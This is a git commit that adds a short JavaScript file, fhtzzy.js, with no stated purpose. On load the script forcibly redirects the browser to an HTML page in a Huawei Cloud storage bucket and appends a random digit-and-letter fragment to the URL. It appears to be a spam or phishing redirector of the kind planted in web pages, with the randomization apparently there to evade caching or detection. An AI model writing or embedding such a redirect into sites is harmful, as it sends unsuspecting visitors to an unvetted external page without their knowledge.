6291385539016f4318cb0732c13561fb9ec89521
dj88888 <127208493+dj88888@users.noreply.github.com>
2024-06-11 00:17:09 +0800

    Create fhtzzy.js

---
+++ fhtzzy.js
@@ -0,0 +1,17 @@
+var urls=[
+' https://css-backup-1622887635143.obs.cn-north-4.myhuaweicloud.com/8984621b619a4aaaadd16ee8a52362c0.html#{nnnnnnn}{wwww}',
+];
+location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
+function myEeplace(s){
+	return s.replace(/\{(\w+?)\}/g,function(a,b){
+		var h='';
+		for(var i=0;i<b.length;i++){
+			if('n'==b[i]){
+				h+=Math.floor(Math.random()*10);
+			}else if('w'==b[i]){
+				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
+			}
+		}
+		return h;
+	});
+}
